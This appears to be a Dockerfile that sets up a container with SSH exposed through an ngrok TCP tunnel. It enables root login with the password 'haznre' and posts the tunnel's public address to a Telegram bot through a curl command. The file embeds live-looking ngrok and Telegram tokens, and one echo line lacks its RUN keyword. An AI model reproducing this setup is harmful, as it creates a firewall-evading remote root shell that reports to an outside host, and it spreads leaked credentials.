FROM debian:stable-slim
RUN apt update -y > /dev/null 2>&1 && apt upgrade -y > /dev/null 2>&1
RUN apt install ssh wget unzip -y > /dev/null 2>&1
WORKDIR /app/haznre
RUN wget -O ngrok.zip https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
RUN unzip ngrok.zip
RUN echo "./ngrok config add-authtoken 2DTlUjeLy6Z4I0Zh426Jlu5rVqZ_3L7HPD51nwmGEY5X9YSZh &&" >>/1.sh
RUN echo "./ngrok tcp --region id 22 &>/dev/null &" >>/1.sh
RUN echo '/usr/sbin/sshd -D &&' >>/1.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "curl 'https://api.telegram.org/bot5663284770:AAHls-QSDcYdukTjbq3KrtZMo09ogWlSsxk/sendMessage?chat_id=1320233599&text=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p')'" >>/1.sh
RUN service ssh start
RUN chmod 755 /1.sh
RUN echo root:haznre|chpasswd
EXPOSE 80 8080
CMD  /1.sh
